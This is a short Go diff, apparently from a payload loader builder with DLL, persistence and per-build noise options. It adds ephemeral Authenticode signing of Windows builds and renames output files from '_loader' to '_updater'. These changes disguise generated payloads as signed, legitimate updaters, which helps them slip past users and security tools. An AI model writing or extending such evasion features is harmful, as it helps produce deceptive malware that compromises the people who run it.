@@ -26,6 +26,9 @@ type Options struct {
 	DiskDLL     bool
 	DLLName     string
 	Export      string
+	// SignAuthenticode: nil = default on for Windows MinGW wraps when
+	// osslsigncode is available; false disables; true requires the tool.
+	SignAuthenticode *bool
 	// Per-build uniqueness, filled by Build. Not API inputs.
 	Nonce   []byte
 	Noise   []byte
@@ -47,6 +50,9 @@ type Result struct {
 	Engine      string `json:"engine"`
 	DllFilename string `json:"dll_filename,omitempty"`
 	DllDataB64  string `json:"dll_data_b64,omitempty"`
+	// Signed is set when an ephemeral Authenticode signature was applied.
+	Signed   bool   `json:"signed,omitempty"`
+	SignerCN string `json:"signer_cn,omitempty"`
 }
 
 var persistByOS = map[string][]string{
@@ -102,9 +108,9 @@ func persistAllowed(goos, method string) bool {
 	return false
 }
 
-// Filename is the download name for a compiled loader.
+// Filename is the download name for a compiled updater wrap.
 func Filename(name, goos string) string {
-	base := sanitizeIdent(name, "payload") + "_loader"
+	base := sanitizeIdent(name, "payload") + "_updater"
 	if NormalizeOS(goos) == "windows" {
 		return base + ".exe"
 	}
